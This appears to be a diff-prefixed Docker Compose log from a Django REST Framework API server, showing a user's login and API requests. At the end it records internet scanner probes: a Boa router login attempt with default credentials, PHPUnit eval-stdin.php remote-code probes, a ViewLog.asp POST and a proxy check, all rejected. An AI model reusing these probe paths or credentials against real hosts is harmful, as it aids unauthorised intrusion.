+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:51 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:51 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:51 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:51 +0000] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:51 +0000] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:51 +0000] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:51 +0000] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:51 +0000] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:51 +0000] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:51 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0 "http://206.189.68.96/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:53 +0000] "GET /api-auth/login/?next=/api/v1/ HTTP/1.1" 200 2708 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:53 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:53 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:53 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:53 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:53 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0 "http://206.189.68.96/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:56 +0000] "POST /api-auth/login/ HTTP/1.1" 302 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:56 +0000] "GET /api/v1/ HTTP/1.1" 200 10974 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:56 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:56 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:56 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:56 +0000] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:56 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:56 +0000] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:57 +0000] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:57 +0000] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:57 +0000] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:36:57 +0000] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:37:31 +0000] "POST /api/v1/ HTTP/1.1" 201 10364 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:37:31 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:37:31 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:37:31 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:37:31 +0000] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:37:31 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:37:31 +0000] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:37:31 +0000] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:37:31 +0000] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:37:31 +0000] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m 73.97.148.5 - - [21/Sep/2020:19:37:31 +0000] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+[36mweb_1  |[0m Not Found: /boaform/admin/formLogin
+[36mweb_1  |[0m 42.232.39.200 - - [21/Sep/2020:19:43:29 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 2535 "-" "-"
+[36mweb_1  |[0m Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[36mweb_1  |[0m 45.146.164.186 - - [21/Sep/2020:19:58:36 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2585 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[36mweb_1  |[0m Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /cgi-bin/ViewLog.asp
+[36mweb_1  |[0m 118.89.226.174 - - [21/Sep/2020:20:00:16 +0000] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 400 59430 "-" "flow"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 186.155.14.231 - - [21/Sep/2020:20:20:06 +0000] "GET / HTTP/1.1" 404 2413 "-" "-"
+[36mweb_1  |[0m Invalid HTTP_HOST header: 'httpheader.net'. You may need to add 'httpheader.net' to ALLOWED_HOSTS.
+[36mweb_1  |[0m Bad Request: /azenv.php
+[36mweb_1  |[0m 89.248.172.90 - - [21/Sep/2020:20:43:08 +0000] "GET http://httpheader.net/azenv.php HTTP/1.1" 400 58713 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
+[36mweb_1  |[0m [2020-09-21 20:44:15 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:13)
+[36mweb_1  |[0m [2020-09-21 20:44:15 +0000] [13] [INFO] Worker exiting (pid: 13)
+[36mweb_1  |[0m [2020-09-21 20:44:15 +0000] [16] [INFO] Booting worker with pid: 16
+[36mweb_1  |[0m Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[36mweb_1  |[0m 45.146.164.186 - - [21/Sep/2020:20:57:12 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2586 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
